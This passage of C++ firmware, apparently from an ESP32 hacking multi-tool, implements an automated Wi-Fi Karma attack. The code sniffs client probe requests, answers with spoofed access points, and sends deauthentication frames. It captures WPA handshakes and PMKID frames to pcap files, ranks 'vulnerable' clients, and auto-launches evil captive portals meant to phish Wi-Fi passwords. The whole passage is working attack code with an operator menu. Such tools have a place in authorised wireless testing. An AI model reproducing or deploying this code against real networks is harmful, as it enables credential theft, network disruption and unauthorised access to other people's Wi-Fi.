        file.write((uint8_t*)&ts_usec, 4);
        uint32_t len = hs.frameLen;
        file.write((uint8_t*)&len, 4);
        file.write((uint8_t*)&len, 4);
        file.write(hs.eapolFrame, hs.frameLen);
        file.close();
    }
}

void setChannelWithSecond(uint8_t channel) {
    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
    esp_wifi_set_channel(channel, secondCh);
}

void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    if (karmaPaused) return;
    if (!storageAvailable) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
    const uint8_t *frame = pkt->payload;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;

    if (frameSubType == 0x00 && karmaConfig.enableDeauth) {
        String clientMAC = extractMAC(pkt);
        sendDeauth(clientMAC, pgm_read_byte(&karma_channels[channl % 14]), false);
        assocBlocked++;
    }

    if (isEAPOL(pkt) && handshakeCaptureEnabled) {
        HandshakeCapture hs;
        memcpy(hs.bssid, frame + 16, 6);
        hs.ssid = "UNKNOWN";
        hs.channel = pgm_read_byte(&karma_channels[channl % 14]);
        hs.timestamp = millis();
        hs.frameLen = pkt->rx_ctrl.sig_len;
        if (hs.frameLen > 256) hs.frameLen = 256;
        memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
        hs.complete = (classifyEAPOLMessage(pkt) == 4);
        handshakeBuffer.push_back(hs);
        if (handshakeBuffer.size() > 20) handshakeBuffer.erase(handshakeBuffer.begin());
        if (hs.complete) saveHandshakeToFile(hs);
    }

    if (!isProbeRequestWithSSID(pkt)) return;

    String mac = extractMAC(pkt);
    String ssid = extractSSID(pkt);
    if (mac.isEmpty()) return;

    uint32_t fingerprint = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);
    
    String cacheKey = mac + ":" + String(fingerprint);
    if (isMACInCache(cacheKey)) return;
    addMACToCache(cacheKey);

    RSNInfo rsn = extractRSNInfo(pkt->payload, pkt->rx_ctrl.sig_len);
    bool hasRSNInfo = (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0);

    ProbeRequest probe;
    probe.mac = mac;
    probe.ssid = ssid;
    probe.rssi = ctrl.rssi;
    probe.timestamp = millis();
    probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
    probe.fingerprint = fingerprint;

    if (hasRSNInfo) {
        probe.frame_len = pkt->rx_ctrl.sig_len;
        if (probe.frame_len > 128) probe.frame_len = 128;
        memcpy(probe.frame, pkt->payload, probe.frame_len);
        pmkidCaptured++;
    } else {
        probe.frame_len = 0;
    }

    probeBuffer[probeBufferIndex] = probe;
    probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
    if (probeBufferIndex == 0) bufferWrapped = true;

    totalProbes++;
    pkt_counter++;
    analyzeClientBehavior(probe);
    updateChannelActivity(probe.channel);
    updateSSIDFrequency(probe.ssid);

    if (karmaMode == MODE_PASSIVE || karmaMode == MODE_FULL) {
        if (broadcastAttack.isActive() && ssid != "*WILDCARD*" && SSIDDatabase::contains(ssid)) {
            handleBroadcastResponse(ssid, mac);
        }
    }

    bool isRandomizedMAC = false;
    if (mac.startsWith("12:") || mac.startsWith("22:") || 
        mac.startsWith("32:") || mac.startsWith("42:")) isRandomizedMAC = true;
    static uint32_t fakeMACCounter = 0;
    if (isRandomizedMAC) {
        fakeMACCounter++;
        if (fakeMACCounter % 50 == 0) {
            macBlacklist[mac] = millis();
            return;
        }
    }

    if (broadcastAttack.isActive()) broadcastAttack.processProbeResponse(ssid, mac);

    if (karmaConfig.enableAutoKarma) {
        auto it = clientBehaviors.find(probe.fingerprint);
        if (it != clientBehaviors.end()) {
            ClientBehavior &client = it->second;
            uint8_t priority = calculateAttackPriority(client, probe);
            if (priority >= attackConfig.priorityThreshold) {
                if (millis() - client.lastKarmaAttempt > 10000) {
                    queueProbeResponse(probe, rsn);
                    client.lastKarmaAttempt = millis();
                    AttackTier tier = determineAttackTier(priority);
                    if (tier != TIER_NONE && pendingPortals.size() < MAX_PENDING_PORTALS) {
                        PendingPortal portal;
                        portal.ssid = probe.ssid;
                        portal.channel = probe.channel;
                        portal.targetMAC = probe.mac;
                        portal.timestamp = millis();
                        portal.launched = false;
                        portal.templateName = selectedTemplate.name;
                        portal.templateFile = selectedTemplate.filename;
                        portal.isDefaultTemplate = selectedTemplate.isDefault;
                        portal.verifyPassword = selectedTemplate.verifyPassword;
                        portal.priority = priority;
                        portal.tier = tier;
                        portal.duration = getPortalDuration(tier);
                        portal.isCloneAttack = false;
                        portal.probeCount = 1;
                        pendingPortals.push_back(portal);
                    }
                }
            }
        }
    }
}

void clearProbes() {
    probeBufferIndex = 0;
    bufferWrapped = false;
    totalProbes = 0;
    uniqueClients = 0;
    pkt_counter = 0;
    karmaResponsesSent = 0;
    deauthPacketsSent = 0;
    autoPortalsLaunched = 0;
    cloneAttacksLaunched = 0;
    beaconsSent = 0;
    pendingPortals.clear();
    activeNetworks.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();
    pmkidCaptured = 0;
    assocBlocked = 0;
    handshakeBuffer.clear();
    memset(channelActivity, 0, sizeof(channelActivity));
    
    clientBehaviors.clear();
    
    for (auto portal : activePortals) {
        if (portal->instance) delete portal->instance;
        delete portal;
    }
    activePortals.clear();
    
    while (!responseQueue.empty()) responseQueue.pop();
    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
        initMACCache();
    }
    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
        probeBuffer[i].frame_len = 0;
    }
}

std::vector<ProbeRequest> getUniqueProbes() {
    std::vector<ProbeRequest> unique;
    std::set<String> seen;
    int start = bufferWrapped ? probeBufferIndex : 0;
    int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
    count = std::min(count, 20);
    for (int i = 0; i < count; i++) {
        int idx = (start + i) % MAX_PROBE_BUFFER;
        const ProbeRequest &probe = probeBuffer[idx];
        if (probe.ssid.isEmpty() || probe.ssid == "*WILDCARD*") continue;
        String key = String(probe.fingerprint) + ":" + probe.ssid;
        if (seen.find(key) == seen.end()) {
            seen.insert(key);
            unique.push_back(probe);
            if (unique.size() >= 10) break;
        }
    }
    return unique;
}

std::vector<ClientBehavior> getVulnerableClients() {
    std::vector<ClientBehavior> vulnerable;
    size_t count = 0;
    for (const auto &pair : clientBehaviors) {
        if (pair.second.isVulnerable && !pair.second.probedSSIDs.empty()) {
            vulnerable.push_back(pair.second);
            if (++count >= 10) break;
        }
    }
    return vulnerable;
}

void updateKarmaDisplay() {
    unsigned long currentTime = millis();
    if (currentTime - last_time > 1000) {
        last_time = currentTime;
        
        tft.fillRect(10, 45, tftWidth - 20, tftHeight - 70, bruceConfig.bgColor);
        tft.setTextSize(1);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        
        int y = 50;
        
        if (karmaPaused) {
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setCursor(10, y);
            tft.print("KARMA PAUSED");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            y += 15;
        }
        
        tft.setCursor(10, y);
        tft.print("Total:" + String(totalProbes));
        tft.setCursor(70, y);
        tft.print("Uniq:" + String(uniqueClients));
        tft.setCursor(130, y);
        tft.print("Act:" + String(activeNetworks.size()));
        tft.setCursor(190, y);
        tft.print("Pend:" + String(pendingPortals.size()));
        y += 15;
        
        tft.setCursor(10, y);
        tft.print("Queue:" + String(responseQueue.size()));
        tft.setCursor(70, y);
        tft.print("Beac:" + String(beaconsSent));
        tft.setCursor(130, y);
        tft.print("Karma:" + String(karmaResponsesSent));
        tft.setCursor(190, y);
        tft.print("Clone:" + String(cloneAttacksLaunched));
        y += 15;
        
        tft.setCursor(10, y);
        tft.print("Port:" + String(autoPortalsLaunched) + "/" + String(activePortals.size()));
        tft.setCursor(100, y);
        tft.print("HS:" + String(handshakeBuffer.size()));
        tft.setCursor(160, y);
        tft.print("PMKID:" + String(pmkidCaptured));
        y += 15;
        
        tft.setCursor(10, y);
        tft.print("Ch:" + String(pgm_read_byte(&karma_channels[channl % 14])));
        tft.setCursor(70, y);
        String hopStatus = String(auto_hopping ? "Auto:" : "Man:") + String(hop_interval) + "ms";
        tft.print(hopStatus);
        y += 15;
        
        tft.setCursor(10, y);
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 currentBSSID[0], currentBSSID[1], currentBSSID[2],
                 currentBSSID[3], currentBSSID[4], currentBSSID[5]);
        tft.print("MAC:" + String(macStr));
        
        String modeText = "";
        switch(karmaMode) {
            case MODE_PASSIVE: modeText = "PASSIVE"; break;
            case MODE_BROADCAST: modeText = "BROADCAST"; break;
            case MODE_FULL: modeText = "FULL"; break;
            default: modeText = "PASSIVE"; break;
        }
        tft.setCursor(tftWidth - 10 - (modeText.length() * 6), y);
        tft.print(modeText);
        y += 15;
        
        if (templateSelected && !selectedTemplate.name.isEmpty()) {
            tft.setCursor(10, y);
            String templateText = "Template:" + selectedTemplate.name;
            if (templateText.length() > 40) templateText = templateText.substring(0, 37) + "...";
            tft.print(templateText);
            y += 15;
        }
        
        if (broadcastAttack.isActive()) {
            tft.setCursor(10, y);
            tft.print("Broadcast:" + broadcastAttack.getProgressString());
            y += 15;
        } else {
            y += 15;
        }
        
        tft.setCursor(10, tftHeight - 15);
        tft.print("SEL/ESC:Menu | Prev/Next:Channel");
    }
}

void saveNetworkHistory(FS &fs) {
    if (!storageAvailable) return;
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    String filename = "/ProbeData/network_history_" + String(millis()) + ".csv";
    File file = fs.open(filename, FILE_WRITE);
    if (file) {
        file.println("SSID,ResponsesSent,SuccessfulConnections,LastResponse");
        size_t count = 0;
        for (const auto &history : networkHistory) {
            file.printf("\"%s\",%lu,%lu,%lu\n", history.first.c_str(),
                       history.second.responsesSent, history.second.successfulConnections,
                       history.second.lastResponse);
            if (++count >= 20) break;
        }
        file.close();
    }
}

void karma_setup() {
    // Stop WebUI before setting WiFi mode for karma attack
    cleanlyStopWebUiForWiFiFeature();
    static bool isInitialized = false;
    if (isInitialized) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        delay(100);
        isInitialized = false;
    }
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    
    // Force full screen clear on entry
    forceFullRedraw();
    
    returnToMenu = false;
    isPortalActive = false;
    restartKarmaAfterPortal = false;
    templateSelected = false;
    karmaPaused = false;
    probeBufferIndex = 0;
    bufferWrapped = false;
    beaconsSent = 0;
    pmkidCaptured = 0;
    assocBlocked = 0;

    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
        probeBuffer[i].frame_len = 0;
    }

    if (macRingBuffer) vRingbufferDelete(macRingBuffer);
    initMACCache();
    pendingPortals.clear();
    activeNetworks.clear();
    clientBehaviors.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();
    handshakeBuffer.clear();
    
    for (auto portal : activePortals) {
        if (portal->instance) delete portal->instance;
        delete portal;
    }
    activePortals.clear();
    
    while (!responseQueue.empty()) responseQueue.pop();
    generateRandomBSSID(currentBSSID);
    lastMACRotation = millis();

    karmaMode = MODE_PASSIVE;

    drawMainBorderWithTitle("MODERN KARMA ATTACK");
    displayTextLine("Enhanced Karma v3.0");
    delay(500);

    if (!selectPortalTemplate(true)) {
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Starting without portal...");
        delay(1000);
    }

    drawMainBorderWithTitle("ENHANCED KARMA ATK");
    FS *Fs = nullptr;
    String FileSys = "LittleFS";
    if (getFsStorage(Fs)) {
        FileSys = (Fs == &SD) ? "SD" : "LittleFS";
        is_LittleFS = (Fs == &LittleFS);
        filen = generateUniqueFilename(*Fs, false);
        storageAvailable = true;
    } else {
        Fs = &LittleFS;
        FileSys = "LittleFS";
        is_LittleFS = true;
        filen = generateUniqueFilename(LittleFS, false);
        storageAvailable = checkLittleFsSizeNM();
    }
    if (storageAvailable && !Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");
    
    // Force another full clear before showing main screen
    forceFullRedraw();
    drawMainBorderWithTitle("ENHANCED KARMA ATK");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    padprintln("Saved to " + FileSys);
    padprintln("Modern Karma Started");
    
    clearProbes();

    karmaQueue = xQueueCreate(KARMA_QUEUE_DEPTH, sizeof(ProbeRequest));

    karmaConfig.enableAutoKarma = true;
    karmaConfig.enableDeauth = false;
    karmaConfig.enableSmartHop = false;
    karmaConfig.prioritizeVulnerable = true;
    karmaConfig.enableAutoPortal = templateSelected;
    karmaConfig.maxClients = MAX_CLIENT_TRACK;

    attackConfig.defaultTier = TIER_HIGH;
    attackConfig.enableCloneMode = true;
    attackConfig.enableTieredAttack = true;
    attackConfig.priorityThreshold = 40;
    attackConfig.cloneThreshold = 5;
    attackConfig.enableBeaconing = false;
    attackConfig.highTierDuration = 60000;
    attackConfig.mediumTierDuration = 30000;
    attackConfig.fastTierDuration = 15000;
    attackConfig.cloneDuration = 90000;
    attackConfig.maxCloneNetworks = 2;

    handshakeCaptureEnabled = false;

    ensureWifiPlatform();

    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
    esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
    isInitialized = true;
    vTaskDelay(1000 / portTICK_RATE_MS);
    screenNeedsRedraw = true;

    for (;;) {
        if (restartKarmaAfterPortal) {
            restartKarmaAfterPortal = false;
            activePortalChannel = 0;
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
            auto_hopping = true;
            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
            screenNeedsRedraw = true;
        }
        if (returnToMenu) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            
            for (auto portal : activePortals) {
                if (portal->instance) {
                    delete portal->instance;
                    portal->instance = nullptr;
                }
                delete portal;
            }
            activePortals.clear();
            
            while (!responseQueue.empty()) responseQueue.pop();
            if (macRingBuffer) {
                vRingbufferDelete(macRingBuffer);
                macRingBuffer = NULL;
            }
            if (karmaQueue) {
                vQueueDelete(karmaQueue);
                karmaQueue = nullptr;
            }
            
            vTaskDelay(50 / portTICK_PERIOD_MS);
            return;
        }
        unsigned long currentTime = millis();
        if (is_LittleFS) {
            storageAvailable = checkLittleFsSizeNM();
        }
        rotateBSSID();
        if (karmaConfig.enableSmartHop && !karmaPaused) smartChannelHop();
        if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL) && !karmaPaused) {
            sendDeauth("FF:FF:FF:FF:FF:FF", pgm_read_byte(&karma_channels[channl % 14]), true);
            lastDeauthTime = currentTime;
        }
        if (attackConfig.enableBeaconing && !karmaPaused) sendBeaconFrames();
        if (!karmaPaused) {
            processResponseQueue();
            checkCloneAttackOpportunities();
            checkPendingPortals();
            checkForAssociations();
            checkPortals();
        }
        if (broadcastAttack.isActive() && (karmaMode == MODE_BROADCAST || karmaMode == MODE_FULL) && !karmaPaused) {
            broadcastAttack.update();
        }
        
        if (check(NextPress)) {
            if (!karmaPaused) esp_wifi_set_promiscuous(false);
            channl++;
            if (channl >= 14) channl = 0;
            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
            screenNeedsRedraw = true;
            if (!karmaPaused) {
                vTaskDelay(50 / portTICK_RATE_MS);
                esp_wifi_set_promiscuous(true);
            }
        }
        
        if (check(PrevPress)) {
            if (!karmaPaused) esp_wifi_set_promiscuous(false);
            if (channl == 0) channl = 13;
            else channl--;
            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
            screenNeedsRedraw = true;
            if (!karmaPaused) {
                vTaskDelay(50 / portTICK_PERIOD_MS);
                esp_wifi_set_promiscuous(true);
            }
        }
        
        if (check(SelPress) || check(EscPress)) {
            check(SelPress);
            check(EscPress);
            
            vTaskDelay(200 / portTICK_PERIOD_MS);
            
            std::vector<Option> options = {
                {"Enhanced Stats", [&]() {
                    drawMainBorderWithTitle("ADVANCED STATS");
                    int y = 40;
                    tft.setTextSize(1);
                    tft.setCursor(10, y); y += 15;
                    tft.print("Total: " + String(totalProbes));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Unique: " + String(uniqueClients));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Karma: " + String(karmaResponsesSent));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Beacons: " + String(beaconsSent));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Active: " + String(activeNetworks.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Pending: " + String(pendingPortals.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Portals: " + String(activePortals.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Blacklist: " + String(macBlacklist.size()));
                    tft.setCursor(10, y); y += 15;
                    tft.print("PMKID: " + String(pmkidCaptured));
                    tft.setCursor(10, y); y += 15;
                    tft.print("Handshakes: " + String(handshakeBuffer.size()));
                    tft.setCursor(10, tftHeight - 20);
                    tft.print("Sel: Back");
                    while (!check(SelPress) && !check(EscPress)) {
                        if (check(PrevPress)) break;
                        delay(50);
                    }
                    screenNeedsRedraw = true;
                }},
                
                {karmaPaused ? "Resume Karma" : "Pause Karma", [&]() {
                    karmaPaused = !karmaPaused;
                    if (karmaPaused) {
                        esp_wifi_set_promiscuous(false);
                        displayTextLine("Karma PAUSED");
                    } else {
                        esp_wifi_set_promiscuous(true);
                        displayTextLine("Karma RESUMED");
                    }
                    delay(1000);
                    screenNeedsRedraw = true;
                }},
                
                {"Rotate MAC Now", [&]() {
                    generateRandomBSSID(currentBSSID);
                    lastMACRotation = millis();
                    displayTextLine("MAC rotated");
                    delay(1000);
                    screenNeedsRedraw = true;
                }},
                
                {"Set Mode", [&]() {
                    std::vector<Option> modeOptions = {
                        {"Passive (Listen only)", [&]() {
                            karmaMode = MODE_PASSIVE;
                            broadcastAttack.stop();
                            attackConfig.enableBeaconing = false;
                            displayTextLine("Passive mode");
                            delay(1000);
                        }},
                        {"Broadcast (Advertise SSIDs)", [&]() {
                            karmaMode = MODE_BROADCAST;
                            if (!karmaPaused) {
                                broadcastAttack.start();
                                attackConfig.enableBeaconing = true;
                            }
                            displayTextLine("Broadcast mode");
                            delay(1000);
                        }},
                        {"Full (Both)", [&]() {
                            karmaMode = MODE_FULL;
                            if (!karmaPaused) {
                                broadcastAttack.start();
                                attackConfig.enableBeaconing = true;
                            }
                            displayTextLine("Full mode");
                            delay(1000);
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(modeOptions);
                    screenNeedsRedraw = true;
                }},
                
                {"Channel Control", [&]() {
                    std::vector<Option> channelOptions = {
                        {"Next Channel", [&]() {
                            if (!karmaPaused) esp_wifi_set_promiscuous(false);
                            channl++;
                            if (channl >= 14) channl = 0;
                            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                            screenNeedsRedraw = true;
                            if (!karmaPaused) esp_wifi_set_promiscuous(true);
                            displayTextLine("Channel: " + String(karma_channels[channl % 14]));
                            delay(1000);
                        }},
                        {"Previous Channel", [&]() {
                            if (!karmaPaused) esp_wifi_set_promiscuous(false);
                            if (channl == 0) channl = 13;
                            else channl--;
                            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                            screenNeedsRedraw = true;
                            if (!karmaPaused) esp_wifi_set_promiscuous(true);
                            displayTextLine("Channel: " + String(karma_channels[channl % 14]));
                            delay(1000);
                        }},
                        {"Auto Hop ON/OFF", [&]() {
                            auto_hopping = !auto_hopping;
                            displayTextLine(auto_hopping ? "Auto Hop ON" : "Auto Hop OFF");
                            delay(1000);
                        }},
                        {"Set Interval", [&]() {
                            std::vector<Option> intervalOptions = {
                                {"500ms", [&]() { hop_interval = 500; }},
                                {"1000ms", [&]() { hop_interval = 1000; }},
                                {"2000ms", [&]() { hop_interval = 2000; }},
                                {"3000ms", [&]() { hop_interval = 3000; }},
                                {"Back", [&]() {}}
                            };
                            loopOptions(intervalOptions);
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(channelOptions);
                }},
                
                {"Attack Settings", [&]() {
                    std::vector<Option> attackOptions = {
                        {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma", [&]() {
                            karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
                            displayTextLine(karmaConfig.enableAutoKarma ? "Auto Karma ON" : "Auto Karma OFF");
                            delay(1000);
                        }},
                        {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal", [&]() {
                            if (!templateSelected) {
                                displayTextLine("Select template first!");
                                delay(1000);
                                return;
                            }
                            karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
                            displayTextLine(karmaConfig.enableAutoPortal ? "Auto Portal ON" : "Auto Portal OFF");
                            delay(1000);
                        }},
                        {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth", [&]() {
                            karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
                            displayTextLine(karmaConfig.enableDeauth ? "Deauth ON" : "Deauth OFF");
                            delay(1000);
                        }},
                        {attackConfig.enableBeaconing ? "* Beaconing" : "- Beaconing", [&]() {
                            attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
                            if (attackConfig.enableBeaconing && broadcastAttack.isActive()) {
                                karmaMode = MODE_FULL;
                            } else if (attackConfig.enableBeaconing || broadcastAttack.isActive()) {
                                karmaMode = MODE_BROADCAST;
                            } else {
                                karmaMode = MODE_PASSIVE;
                            }
                            displayTextLine(attackConfig.enableBeaconing ? "Beaconing ON" : "Beaconing OFF");
                            delay(1000);
                        }},
                        {handshakeCaptureEnabled ? "* HS Capture" : "- HS Capture", [&]() {
                            handshakeCaptureEnabled = !handshakeCaptureEnabled;
                            displayTextLine(handshakeCaptureEnabled ? "Handshake Capture ON" : "Handshake Capture OFF");
                            delay(1000);
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(attackOptions);
                }},
                
                {"SSID Database", [&]() {
                    std::vector<Option> dbOptions = {
                        {broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
                            if (broadcastAttack.isActive()) {
                                broadcastAttack.stop();
                                if (attackConfig.enableBeaconing) {
                                    karmaMode = MODE_BROADCAST;
                                } else {
                                    karmaMode = MODE_PASSIVE;
                                }
                                displayTextLine("Broadcast stopped");
                            } else {
                                broadcastAttack.start();
                                if (attackConfig.enableBeaconing) {
                                    karmaMode = MODE_FULL;
                                } else {
                                    karmaMode = MODE_BROADCAST;
                                }
                                size_t total = SSIDDatabase::getCount();
                                displayTextLine("Broadcast started: " + String(total) + " SSIDs");
                            }
                            delay(1000);
                        }},
                        {"Database Info", [&]() {
                            drawMainBorderWithTitle("SSID DATABASE");
                            int y = 60;
                            tft.setTextSize(1);
                            tft.fillRect(10, 40, tftWidth - 20, 100, bruceConfig.bgColor);
                            size_t total = SSIDDatabase::getCount();
                            size_t cached = SSIDDatabase::getAllSSIDs().size();
                            tft.setCursor(10, y); y += 15;
                            tft.print("Total SSIDs: " + String(total));
                            tft.setCursor(10, y); y += 15;
                            tft.print("Cached: " + String(cached));
                            tft.setCursor(10, y); y += 15;
                            tft.print("Progress: " + broadcastAttack.getProgressString());
                            tft.setCursor(10, tftHeight - 20);
                            tft.print("Sel: Back");
                            while (!check(SelPress) && !check(EscPress)) delay(50);
                        }},
                        {"Set Speed", [&]() {
                            std::vector<Option> speedOptions = {
                                {"Fast (200ms)", [&]() { broadcastAttack.setBroadcastInterval(200); displayTextLine("Speed: Fast"); delay(1000); }},
                                {"Normal (300ms)", [&]() { broadcastAttack.setBroadcastInterval(300); displayTextLine("Speed: Normal"); delay(1000); }},
                                {"Slow (500ms)", [&]() { broadcastAttack.setBroadcastInterval(500); displayTextLine("Speed: Slow"); delay(1000); }},
                                {"Back", [&]() {}}
                            };
                            loopOptions(speedOptions);
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(dbOptions);
                }},
                
                {"Karma Attack", [&]() {
                    std::vector<ClientBehavior> vulnerable = getVulnerableClients();
                    std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();
                    if (vulnerable.empty() && uniqueProbes.empty()) {
                        displayTextLine("No targets found!");
                        delay(1000);
                        screenNeedsRedraw = true;
                        return;
                    }
                    std::vector<Option> karmaOptions;
                    for (const auto &client : vulnerable) {
                        if (!client.probedSSIDs.empty()) {
                            String itemText = client.lastMAC.substring(9) + " (VULN)";
                            karmaOptions.push_back({itemText.c_str(), [=, &client]() {
                                launchManualEvilPortal(client.probedSSIDs[0], 
                                                      client.favoriteChannel, 
                                                      selectedTemplate.verifyPassword);
                                screenNeedsRedraw = true;
                            }});
                        }
                    }
                    for (const auto &probe : uniqueProbes) {
                        String itemText = probe.ssid + " (" + String(probe.rssi) + "|ch" + String(probe.channel) + ")";
                        if (itemText.length() > 40) itemText = itemText.substring(0, 37) + "...";
                        karmaOptions.push_back({itemText.c_str(), [=, &probe]() {
                            launchManualEvilPortal(probe.ssid, probe.channel, 
                                                  selectedTemplate.verifyPassword);
                            screenNeedsRedraw = true;
                        }});
                    }
                    karmaOptions.push_back({"Back", [&]() {}});
                    loopOptions(karmaOptions);
                    screenNeedsRedraw = true;
                }},
                
                {"Select Template", [&]() {
                    selectPortalTemplate(false);
                }},
                
                {"Attack Strategy", [&]() {
                    std::vector<Option> strategyOptions = {
                        {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode", [&]() {
                            attackConfig.defaultTier = TIER_CLONE;
                            displayTextLine("Clone mode enabled");
                            delay(1000);
                        }},
                        {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier", [&]() {
                            attackConfig.defaultTier = TIER_HIGH;
                            displayTextLine("High tier mode");
                            delay(1000);
                        }},
                        {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier", [&]() {
                            attackConfig.defaultTier = TIER_MEDIUM;
                            displayTextLine("Medium tier mode");
                            delay(1000);
                        }},
                        {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier", [&]() {
                            attackConfig.defaultTier = TIER_FAST;
                            displayTextLine("Fast tier mode");
                            delay(1000);
                        }},
                        {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection", [&]() {
                            attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
                            displayTextLine(attackConfig.enableCloneMode ? "Clone detection ON" : "Clone detection OFF");
                            delay(1000);
                        }},
                        {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack", [&]() {
                            attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
                            displayTextLine(attackConfig.enableTieredAttack ? "Tiered attack ON" : "Tiered attack OFF");
                            delay(1000);
                        }},
                        {"Back", [&]() {}}
                    };
                    loopOptions(strategyOptions);
                }},
                
                {"Active Broadcast Attack", [&]() {
                    std::vector<Option> broadcastOptions;
                    broadcastOptions.push_back({broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
                        if (broadcastAttack.isActive()) {
                            broadcastAttack.stop();
                            if (attackConfig.enableBeaconing) {
                                karmaMode = MODE_BROADCAST;
                            } else {
                                karmaMode = MODE_PASSIVE;
                            }
                        } else {
                            broadcastAttack.start();
                            if (attackConfig.enableBeaconing) {
                                karmaMode = MODE_FULL;
                            } else {
                                karmaMode = MODE_BROADCAST;
                            }
                        }
                        delay(1000);
                    }});
                    broadcastOptions.push_back({"Set Speed", [&]() {
                        std::vector<Option> speedOptions = {
                            {"Fast (200ms)", [&]() { broadcastAttack.setBroadcastInterval(200); displayTextLine("Speed: Fast"); delay(1000); }},
                            {"Normal (300ms)", [&]() { broadcastAttack.setBroadcastInterval(300); displayTextLine("Speed: Normal"); delay(1000); }},
                            {"Slow (500ms)", [&]() { broadcastAttack.setBroadcastInterval(500); displayTextLine("Speed: Slow"); delay(1000); }},
                            {"Back", [&]() {}}
                        };
                        loopOptions(speedOptions);
                    }});
                    broadcastOptions.push_back({"Show Stats", [&]() {
                        drawMainBorderWithTitle("BROADCAST STATS");
                        int y = 40;
                        tft.setTextSize(1);
                        size_t totalSSIDs = SSIDDatabase::getCount();
                        size_t currentPos = broadcastAttack.getCurrentPosition();
                        float progress = broadcastAttack.getProgressPercent();
                        BroadcastStats stats = broadcastAttack.getStats();

                        tft.setCursor(10, y); y += 15;
                        tft.print("Total SSIDs: " + String(totalSSIDs));
                        tft.setCursor(10, y); y += 15;
                        tft.print("Progress: " + String(progress, 1) + "%");
                        tft.setCursor(10, y); y += 15;
                        tft.print("Broadcasts: " + String(stats.totalBroadcasts));
                        tft.setCursor(10, y); y += 15;
                        tft.print("Responses: " + String(stats.totalResponses));
                        tft.setCursor(10, y); y += 15;
                        tft.print("Status: " + String(broadcastAttack.isActive() ? "ACTIVE" : "INACTIVE"));
                        tft.setCursor(10, tftHeight - 20);
                        tft.print("Sel: Back");
                        while (!check(SelPress) && !check(EscPress)) {
                            if (check(PrevPress)) break;
                            delay(50);
                        }
                    }});
